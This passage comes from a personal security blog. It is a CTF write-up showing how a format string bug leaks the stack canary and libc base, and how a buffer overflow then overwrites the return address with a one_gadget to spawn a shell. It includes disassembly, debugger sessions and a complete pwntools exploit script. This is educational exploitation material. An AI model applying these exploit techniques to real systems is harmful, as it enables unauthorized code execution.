itself. A variant of return-to-libc is return-oriented programming (ROP), which sets up a series of return addresses, each of which executes a small sequence of cherry-picked machine instructions within the existing program code or system libraries, sequence which ends with a return. These so-called gadgets each accomplish some simple register manipulation or similar execution before returning, and stringing them together achieves the attacker\u0026rsquo;s ends. It is even possible to use \u0026ldquo;returnless\u0026rdquo; return-oriented programming by exploiting instructions or groups of instructions that behave much like a return instruction.\nThis is an ongoing series on my blog.\nmain #Now, let\u0026rsquo;s get started:-\nAttached files: #q3\nAnalysing the binary #Let\u0026rsquo;s analyse or reverse enginner the binary first, I\u0026rsquo;ll be using radare2 for disassembly and IDA Pro for decompiled functions:-\nrobin@oracle:~$ r2 -AAAA q3 --snip-- [0x00000670]\u0026gt; afl 0x00000000 3 72 -\u0026gt; 73 sym.imp.__libc_start_main 0x000005f8 3 23 sym._init 0x00000620 1 6 sym.imp.puts 0x00000630 1 6 sym.imp.__stack_chk_fail 0x00000640 1 6 sym.imp.printf 0x00000650 1 6 sym.imp.fgets 0x00000660 1 6 sub.__cxa_finalize_248_660 0x00000670 1 43 entry0 0x000006a0 4 50 -\u0026gt; 40 sym.deregister_tm_clones 0x000006e0 4 66 -\u0026gt; 57 sym.register_tm_clones 0x00000730 4 49 sym.__do_global_dtors_aux 0x00000770 1 10 entry1.init 0x0000077a 3 182 sym.main 0x00000830 4 101 sym.__libc_csu_init 0x000008a0 1 2 sym.__libc_csu_fini 0x000008a4 1 9 sym._fini No special function is seen here, let\u0026rsquo;s disassemble main:-\n[0x00000670]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 182 | sym.main (); | ; var FILE local_28h @ rbp-0x28 | ; var int local_20h @ rbp-0x20 | ; var int local_18h @ rbp-0x18 | ; var int local_8h @ rbp-0x8 | ; DATA XREF from 0x0000068d (entry0) | 0x0000077a 55 push rbp | 0x0000077b 4889e5 mov rbp, rsp | 0x0000077e 4883ec30 sub rsp, 0x30 ; \u0026#39;0\u0026#39; | 0x00000782 64488b042528. mov rax, qword fs:[0x28] ; [0x28:8]=0x19e0 ; \u0026#39;(\u0026#39; | 0x0000078b 488945f8 mov qword [local_8h], rax | 0x0000078f 31c0 xor eax, eax | 0x00000791 48c745e00000. mov qword [local_20h], 0 | 0x00000799 48c745e80000. mov qword [local_18h], 0 | 0x000007a1 488b05680820. mov rax, qword [obj.stdin] ; loc.stdin ; [0x201010:8]=0 | 0x000007a8 488945d8 mov qword [local_28h], rax | 0x000007ac 488d3d010100. lea rdi, qword str.Enter_name_: ; 0x8b4 ; \u0026#34;Enter name : \u0026#34; ; const char * format | 0x000007b3 b800000000 mov eax, 0 | 0x000007b8 e883feffff call sym.imp.printf ; int printf(const char *format) | 0x000007bd 488b55d8 mov rdx, qword [local_28h] ; FILE *stream | 0x000007c1 488d45e0 lea rax, qword [local_20h] | 0x000007c5 be10000000 mov esi, 0x10 ; int size | 0x000007ca 4889c7 mov rdi, rax ; char *s | 0x000007cd e87efeffff call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream) | 0x000007d2 488d3de90000. lea rdi, qword str.Hello ; 0x8c2 ; \u0026#34;Hello\u0026#34; ; const char * s | 0x000007d9 e842feffff call sym.imp.puts ; int puts(const char *s) | 0x000007de 488d45e0 lea rax, qword [local_20h] | 0x000007e2 4889c7 mov rdi, rax ; const char * format | 0x000007e5 b800000000 mov eax, 0 | 0x000007ea e851feffff call sym.imp.printf ; int printf(const char *format) | 0x000007ef 488d3dd20000. lea rdi, qword str.Enter_sentence_: ; 0x8c8 ; \u0026#34;Enter sentence : \u0026#34; ; const char * format | 0x000007f6 b800000000 mov eax, 0 | 0x000007fb e840feffff call sym.imp.printf ; int printf(const char *format) | 0x00000800 488b55d8 mov rdx, qword [local_28h] ; FILE *stream | 0x00000804 488d45e0 lea rax, qword [local_20h] | 0x00000808 be00010000 mov esi, 0x100 ; int size | 0x0000080d 4889c7 mov rdi, rax ; char *s | 0x00000810 e83bfeffff call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream) | 0x00000815 b800000000 mov eax, 0 | 0x0000081a 488b4df8 mov rcx, qword [local_8h] | 0x0000081e 6448330c2528. xor rcx, qword fs:[0x28] | ,=\u0026lt; 0x00000827 7405 je 0x82e | | 0x00000829 e802feffff call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void) | | ; JMP XREF from 0x00000827 (sym.main) | `-\u0026gt; 0x0000082e c9 leave \\ 0x0000082f c3 ret First input is getting printed and as you can see at line 0x000007d2 488d3de90000. lea rdi, qword str.Hello ; 0x8c2 ; \u0026quot;Hello\u0026quot; ; const char * s there\u0026rsquo;s no specifier at the commented string otherwise radare2 would\u0026rsquo;ve been able to show it. And since it\u0026rsquo;s getting printed with 0x000007ea e851feffff call sym.imp.printf ; int printf(const char *format) instruction we know where the format string vulerability is.\nFor ease of understanding, we have a decompiled function with the help of IDA:-\nint __cdecl main(int argc, const char **argv, const char **envp) { FILE *stream; // ST08_8 char s[8]; // [rsp+10h] [rbp-20h] __int64 v6; // [rsp+18h] [rbp-18h] unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); *(_QWORD *)s = 0LL; v6 = 0LL; stream = (FILE *)_bss_start; printf(\u0026#34;Enter name : \u0026#34;, argv, envp); fgets(s, 16, stream); puts(\u0026#34;Hello\u0026#34;); printf(s, 16LL); \u0026lt;-- Here\u0026#39;s the vulnerability, just like in that example, isn\u0026#39;t it? printf(\u0026#34;Enter sentence : \u0026#34;); fgets(s, 256, stream); return 0; } Exploiting the binary #So, let\u0026rsquo;s make a script to find the offset for the input on stack, who knows we might be able to get something of interest?\nfrom pwn import * for i in range(2,20): p = process(\u0026#34;./q3\u0026#34;) p.sendline(\u0026#34;AAAA %{}$lx\u0026#34;.format(i)) # will print the stack data in hex format p.recvline() # Hello print i,p.recvline() p.close() Let\u0026rsquo;s run it:-\nrobin@oracle:~/CTFs/Defcamp$ python find_off.py [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8323 2 AAAA 7ffff7dd18c0 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8323) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8325 3 AAAA 7ffff7af4154 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8325) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8327 4 AAAA 7ffff7fd24c0 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8327) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8329 5 AAAA 0 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8329) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8331 6 AAAA 7ffff7de59a0 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8331) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8333 7 AAAA 7ffff7dcfa00 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8333) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8335 8 AAAA 2438252041414141 \u0026lt;--- Offset [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8335) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8337 9 AAAA a786c [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8337) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8339 10 AAAA 7fffffffde80 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8339) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8341 11 AAAA a17e6a7c1c53c000 \u0026lt;--- This is of interest [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8341) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8343 12 AAAA 555555554830 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8343) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8345 13 AAAA 7ffff7a05b97 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8345) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8347 14 AAAA 1 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8347) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8349 15 AAAA 7fffffffde88 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8349) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8351 16 AAAA 100008000 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8351) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8353 17 AAAA 55555555477a [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8353) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8355 18 AAAA 0 [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8355) [+] Starting local process \u0026#39;./q3\u0026#39;: pid 8357 19 AAAA 8f241916698aca1f \u0026lt;--- This is of interest [*] Stopped process \u0026#39;./q3\u0026#39; (pid 8357) So, the addresses starting from 0x7f are libc addresses and we have offset for our input at 8 but what are those at offset 11 and 19? Whatever it is, this is something we might need. Upon discussing this from a guy(super helpful) named Faith, he told me that it could be stack canary address. Now, if we didn\u0026rsquo;t had a format string vulnerability then we had to bruteforce the value,luckily enough we have that vulnerability here.\nTo be more broad:- I\u0026rsquo;ll be using gdb-gef as we have to inspect some of the registers, et\u0026rsquo;s break the __main__ function:-\ngef➤ disas main Dump of assembler code for function main: 0x000000000000077a \u0026lt;+0\u0026gt;:\tpush rbp 0x000000000000077b \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000000077e \u0026lt;+4\u0026gt;:\tsub rsp,0x30 0x0000000000000782 \u0026lt;+8\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x000000000000078b \u0026lt;+17\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax 0x000000000000078f \u0026lt;+21\u0026gt;:\txor eax,eax 0x0000000000000791 \u0026lt;+23\u0026gt;:\tmov QWORD PTR [rbp-0x20],0x0 0x0000000000000799 \u0026lt;+31\u0026gt;:\tmov QWORD PTR [rbp-0x18],0x0 0x00000000000007a1 \u0026lt;+39\u0026gt;:\tmov rax,QWORD PTR [rip+0x200868] # 0x201010 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00000000000007a8 \u0026lt;+46\u0026gt;:\tmov QWORD PTR [rbp-0x28],rax 0x00000000000007ac \u0026lt;+50\u0026gt;:\tlea rdi,[rip+0x101] # 0x8b4 0x00000000000007b3 \u0026lt;+57\u0026gt;:\tmov eax,0x0 0x00000000000007b8 \u0026lt;+62\u0026gt;:\tcall 0x640 \u0026lt;printf@plt\u0026gt; 0x00000000000007bd \u0026lt;+67\u0026gt;:\tmov rdx,QWORD PTR [rbp-0x28] 0x00000000000007c1 \u0026lt;+71\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000000007c5 \u0026lt;+75\u0026gt;:\tmov esi,0x10 0x00000000000007ca \u0026lt;+80\u0026gt;:\tmov rdi,rax 0x00000000000007cd \u0026lt;+83\u0026gt;:\tcall 0x650 \u0026lt;fgets@plt\u0026gt; 0x00000000000007d2 \u0026lt;+88\u0026gt;:\tlea rdi,[rip+0xe9] # 0x8c2 0x00000000000007d9 \u0026lt;+95\u0026gt;:\tcall 0x620 \u0026lt;puts@plt\u0026gt; 0x00000000000007de \u0026lt;+100\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000000007e2 \u0026lt;+104\u0026gt;:\tmov rdi,rax 0x00000000000007e5 \u0026lt;+107\u0026gt;:\tmov eax,0x0 0x00000000000007ea \u0026lt;+112\u0026gt;:\tcall 0x640 \u0026lt;printf@plt\u0026gt; 0x00000000000007ef \u0026lt;+117\u0026gt;:\tlea rdi,[rip+0xd2] # 0x8c8 0x00000000000007f6 \u0026lt;+124\u0026gt;:\tmov eax,0x0 0x00000000000007fb \u0026lt;+129\u0026gt;:\tcall 0x640 \u0026lt;printf@plt\u0026gt; 0x0000000000000800 \u0026lt;+134\u0026gt;:\tmov rdx,QWORD PTR [rbp-0x28] 0x0000000000000804 \u0026lt;+138\u0026gt;:\tlea rax,[rbp-0x20] 0x0000000000000808 \u0026lt;+142\u0026gt;:\tmov esi,0x100 0x000000000000080d \u0026lt;+147\u0026gt;:\tmov rdi,rax 0x0000000000000810 \u0026lt;+150\u0026gt;:\tcall 0x650 \u0026lt;fgets@plt\u0026gt; 0x0000000000000815 \u0026lt;+155\u0026gt;:\tmov eax,0x0 0x000000000000081a \u0026lt;+160\u0026gt;:\tmov rcx,QWORD PTR [rbp-0x8] 0x000000000000081e \u0026lt;+164\u0026gt;:\txor rcx,QWORD PTR fs:0x28 \u0026lt;- This line checks whether the provided canary is equal to the one calculated before 0x0000000000000827 \u0026lt;+173\u0026gt;:\tje 0x82e \u0026lt;main+180\u0026gt; 0x0000000000000829 \u0026lt;+175\u0026gt;:\tcall 0x630 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x000000000000082e \u0026lt;+180\u0026gt;:\tleave 0x000000000000082f \u0026lt;+181\u0026gt;:\tret End of assembler dump. Let\u0026rsquo;s try to check those two offsets 11 and 19 to see if it\u0026rsquo;s the stack canary or not:-\nAt first, we need to setup a breakpoint at the instruction where the comaprison happens i.e. main+164 and we will just give random input at second and analyse the registers.\ngef➤ b *main+164 Breakpoint 1 at 0x81e gef➤ r Starting program: /home/robin/CTFs/Defcamp/q3 Enter name : %11$lx %19$lx Hello 50a01b0663fa1e00 ebd42dea12670b41 Enter sentence : AAAA [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x0 $rbx : 0x0 $rcx : 0x50a01b0663fa1e00 $rdx : 0x00007ffff7dd18d0 → 0x0000000000000000 $rsp : 0x00007fffffffdd10 → 0x00007ffff7de59a0 → \u0026lt;_dl_fini+0\u0026gt; push rbp $rbp : 0x00007fffffffdd40 → 0x0000555555554830 → \u0026lt;__libc_csu_init+0\u0026gt; push r15 $rsi : 0x00007fffffffdd20 → 0x2520000a41414141 (\u0026#34;AAAA\u0026#34;?) $rdi : 0x00007fffffffdd21 → 0x312520000a414141 (\u0026#34;AAA\u0026#34;?) $rip : 0x000055555555481e → 0x000028250c334864 (\u0026#34;dH3 %(\u0026#34;?) $r8 : 0x0000555555756675 → \u0026#34;x %19$lx\u0026#34; $r9 : 0x00007ffff7fd24c0 → 0x00007ffff7fd24c0 → [loop detected] $r10 : 0x00007ffff7fd24c0 → 0x00007ffff7fd24c0 → [loop detected] $r11 : 0x246 $r12 : 0x0000555555554670 → \u0026lt;_start+0\u0026gt; xor ebp, ebp $r13 : 0x00007fffffffde20 → 0x0000000000000001 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdd10│+0x0000: 0x00007ffff7de59a0 → \u0026lt;_dl_fini+0\u0026gt; push rbp\t← $rsp 0x00007fffffffdd18│+0x0008: 0x00007ffff7dcfa00 → 0x00000000fbad2288 0x00007fffffffdd20│+0x0010: 0x2520000a41414141 (\u0026#34;AAAA\u0026#34;?)\t← $rsi 0x00007fffffffdd28│+0x0018: 0x00000a786c243931 (\u0026#34;19$lx\u0026#34;?) 0x00007fffffffdd30│+0x0020: 0x00007fffffffde20 → 0x0000000000000001 0x00007fffffffdd38│+0x0028: 0x50a01b0663fa1e00 0x00007fffffffdd40│+0x0030: 0x0000555555554830 → \u0026lt;__libc_csu_init+0\u0026gt; push r15\t← $rbp 0x00007fffffffdd48│+0x0038: 0x00007ffff7a05b97 → \u0026lt;__libc_start_main+231\u0026gt; mov edi, eax ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x555555554810 \u0026lt;main+150\u0026gt; call 0x555555554650 \u0026lt;fgets@plt\u0026gt; 0x555555554815 \u0026lt;main+155\u0026gt; mov eax, 0x0 0x55555555481a \u0026lt;main+160\u0026gt; mov rcx, QWORD PTR [rbp-0x8] → 0x55555555481e \u0026lt;main+164\u0026gt; xor rcx, QWORD PTR fs:0x28 0x555555554827 \u0026lt;main+173\u0026gt; je 0x55555555482e \u0026lt;main+180\u0026gt; 0x555555554829 \u0026lt;main+175\u0026gt; call 0x555555554630 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x55555555482e \u0026lt;main+180\u0026gt; leave 0x55555555482f \u0026lt;main+181\u0026gt; ret 0x555555554830 \u0026lt;__libc_csu_init+0\u0026gt; push r15 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;q3\u0026#34;, stopped, reason: BREAKPOINT ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x55555555481e → main() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Breakpoint 1, 0x000055555555481e in main () gef➤ p $rcx $1 = 0x50a01b0663fa1e00 \u0026lt;-- Ye, there it is. gef➤ Here, we have a stack canary leak which is equal to the one in rcx register where it\u0026rsquo;s getting stored. So, now we need to find out the libc offset as we are now on buffer overflow stage. As we already know we need to get libc offset and from earlier that format string vulnerability was causing the libc address to leak, so it\u0026rsquo;d be a matter of time to find it out:-\ngef➤ r Starting program: /home/robin/CTFs/Defcamp/q3 Enter name : %3$lx Hello 7ffff7af4154 Enter sentence : ^C Program received signal SIGINT, Interrupt. -- snip -- gef➤ vmmap Start End Offset Perm Path 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /home/robin/CTFs/Defcamp/q3 0x0000555555754000 0x0000555555755000 0x0000000000000000 r-- /home/robin/CTFs/Defcamp/q3 0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /home/robin/CTFs/Defcamp/q3 0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap] 0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so 0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so 0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so 0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so 0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw- 0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so 0x00007ffff7fd1000 0x00007ffff7fd3000 0x0000000000000000 rw- 0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] gef➤ p 0x7ffff7af4154 - 0x00007ffff79e4000 $1 = 0x110154 Using vmmap we get to know the address of executable and writable libc and using the address we leaked from %3$lx input we have the leaked libc address, we just subtracted the leak address from the libc.so.6 address, we get the offset.\nTime to find out the offsets for register so we we will create our final exploit:-\ngef➤ b *main+164 Breakpoint 1 at 0x81e gef➤ pattern create 100 [+] Generating a pattern of 100 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as \u0026#39;$_gef0\u0026#39; gef➤ r Starting program: /home/robin/CTFs/Defcamp/q3 Enter name : AAAA Hello AAAA Enter sentence : aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x0 $rbx : 0x0 $rcx : 0x6161616161616164 (\u0026#34;daaaaaaa\u0026#34;?) $rdx : 0x00007ffff7dd18d0 → 0x0000000000000000 $rsp : 0x00007fffffffdd10 → 0x00007ffff7de59a0 → \u0026lt;_dl_fini+0\u0026gt; push rbp $rbp : 0x00007fffffffdd40 → \u0026#34;eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]\u0026#34; $rsi : 0x00007fffffffdd20 → \u0026#34;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]\u0026#34; $rdi : 0x00007fffffffdd21 → \u0026#34;aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]\u0026#34; $rip : 0x000055555555481e → 0x000028250c334864 (\u0026#34;dH3 %(\u0026#34;?) $r8 : 0x00005555557566d5 → 0x0000000000000000 $r9 : 0x00007ffff7fd24c0 → 0x00007ffff7fd24c0 → [loop detected] $r10 : 0x00007ffff7fd24c0 → 0x00007ffff7fd24c0 → [loop detected] $r11 : 0x246 $r12 : 0x0000555555554670 → \u0026lt;_start+0\u0026gt; xor ebp, ebp $r13 : 0x00007fffffffde20 → 0x0000000000000001 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdd10│+0x0000: 0x00007ffff7de59a0 → \u0026lt;_dl_fini+0\u0026gt; push rbp\t← $rsp 0x00007fffffffdd18│+0x0008: 0x00007ffff7dcfa00 → 0x00000000fbad2288 0x00007fffffffdd20│+0x0010: \u0026#34;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]\u0026#34;\t← $rsi 0x00007fffffffdd28│+0x0018: \u0026#34;baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha[...]\u0026#34; 0x00007fffffffdd30│+0x0020: \u0026#34;caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia[...]\u0026#34; 0x00007fffffffdd38│+0x0028: \u0026#34;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]\u0026#34; 0x00007fffffffdd40│+0x0030: \u0026#34;eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]\u0026#34;\t← $rbp 0x00007fffffffdd48│+0x0038: \u0026#34;faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]\u0026#34; ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x555555554810 \u0026lt;main+150\u0026gt; call 0x555555554650 \u0026lt;fgets@plt\u0026gt; 0x555555554815 \u0026lt;main+155\u0026gt; mov eax, 0x0 0x55555555481a \u0026lt;main+160\u0026gt; mov rcx, QWORD PTR [rbp-0x8] → 0x55555555481e \u0026lt;main+164\u0026gt; xor rcx, QWORD PTR fs:0x28 0x555555554827 \u0026lt;main+173\u0026gt; je 0x55555555482e \u0026lt;main+180\u0026gt; 0x555555554829 \u0026lt;main+175\u0026gt; call 0x555555554630 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x55555555482e \u0026lt;main+180\u0026gt; leave 0x55555555482f \u0026lt;main+181\u0026gt; ret 0x555555554830 \u0026lt;__libc_csu_init+0\u0026gt; push r15 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;q3\u0026#34;, stopped, reason: BREAKPOINT ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x55555555481e → main() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Breakpoint 1, 0x000055555555481e in main () gef➤ pattern search daaaaaaa [+] Searching \u0026#39;daaaaaaa\u0026#39; [+] Found at offset 17 (little-endian search) likely [+] Found at offset 24 (big-endian search) gef➤ pattern search eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka [+] Searching \u0026#39;eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka\u0026#39; [+] Found at offset 32 (big-endian search) gef➤ p $rcx $1 = 0x6161616161616164 \u0026lt;--- Canary value overwrtten As you can see we have overwritten the canary and we have the rcx register offset and we have rbp register offset at 32 which would be 32 - 24 = 8.\nOne_gadget - The best tool for finding one gadget RCE in libc.so.6 #I can honsetly vouch for this tool, this was the first time I used it and it\u0026rsquo;s just awesome. With this tool it was easier to find the gadgets for shell spwaning.\nrobin@oracle:~/CTFs/Defcamp$ ldd q3 linux-vdso.so.1 (0x00007ffff7ffa000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77e2000) /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000) robin@oracle:~/CTFs/Defcamp$ one_gadget /lib/x86_64-linux-gnu/libc.so.6 0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: rcx == NULL 0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL I\u0026rsquo;ll be using the first one 0x4f2c5. Now, it\u0026rsquo;s time to pwn:-\nFinal Exploit #We have almost everything, now it\u0026rsquo;s time for final exploit:-\nHere\u0026rsquo;s the idea, I\u0026rsquo;ll be using the format string specifier to leak canary and libc address and then use the stack canary value to send the payload and using the libc address offset we will get the one_gadget address and we are done.\n#!/usr/bin/env python2 from pwn import * # stack canary is at offset 11 for format string # It is at offset 24 for buffer overflow BINARY = \u0026#39;./q3\u0026#39; elf = ELF(BINARY) context.arch = \u0026#39;amd64\u0026#39; libc = elf.libc p = process(\u0026#34;./q3\u0026#34;) # Leak stack canary (offset 11) and the libc address (offset 3) p.sendline(\u0026#39;%11$lx-%3$lx\u0026#39;) p.recvline() leaks = p.recvline() stack_canary = int(leaks.split(\u0026#39;-\u0026#39;)[0], 16) # Stack Canary libc.address = int(leaks.split(\u0026#39;-\u0026#39;)[1][:-1], 16) - 0x110154 # LIBC offset we found earlier log.info(\u0026#39;canary: \u0026#39; + hex(stack_canary)) log.info(\u0026#39;libc base: \u0026#39; + hex(libc.address)) one_gadget = libc.address + 0x4f2c5 # using one_gadget log.info(\u0026#39;one_gadget: \u0026#39; + hex(one_gadget)) payload = \u0026#39;A\u0026#39;*24 # Write up to the stack canary payload += p64(stack_canary) # Ensure we don\u0026#39;t change the stack canary payload += \u0026#39;B\u0026#39;*8 # Overwrite RBP to reach upto RIP payload += p64(one_gadget) # Overwrite RIP with pre-made shell p.sendline(payload) p.interactive() Running the exploit we will get shell:-\nrobin@oracle:~/CTFs/Defcamp$ python q3_exp.py [*] \u0026#39;/home/robin/CTFs/Defcamp/q3\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./q3\u0026#39;: pid 9550 [*] canary: 0x648678ab45c48e00 [*] libc base: 0x7ffff79e4000 [*] one_gadget: 0x7ffff7a332c5 [*] Switching to interactive mode $ ls core libc.so.6 q3_exp.py q3.til $ [*] Interrupted [*] Stopped process \u0026#39;./q3\u0026#39; (pid 9550) That was it folks, took more than I thought it would but we made it.\nI hope you enjoyed it and learned something today. If you encountered any problem or anything relevant contact me on twitter\n","date":"12 September 2018","permalink":"/posts/fmt-bof/","section":"Posts","summary":"A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.\nForeword #I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.","title":"Binary Exploitation - Format String + Buffer Overflow Vulnerability"},{"content":"","date":null,"permalink":"/tags/pwn-fmtstr-bof-pwntools-canary/","section":"Tags","summary":"","title":"Pwn, Fmtstr, Bof, Pwntools, Canary"},{"content":"Hello, I\u0026rsquo;m Robin! I\u0026rsquo;m a cybersecurity enthusiast who loves diving into binary exploitation and reverse engineering. Right now, I\u0026rsquo;m also exploring the world of game hacking, juggling between different areas of security and hacking. This blog is where I share my journey, document what I learn, and explore the fascinating world of vulnerabilities and exploits.\nI’m always learning—whether it\u0026rsquo;s tackling new challenges, trying out new techniques, or just keeping up with the latest trends in security. My goal here is to share my experiences, insights, and discoveries.\nCertifications #I am occassionally doing some practical certifications. Below are some of the certifications I hold:\nOSCP - Offensive 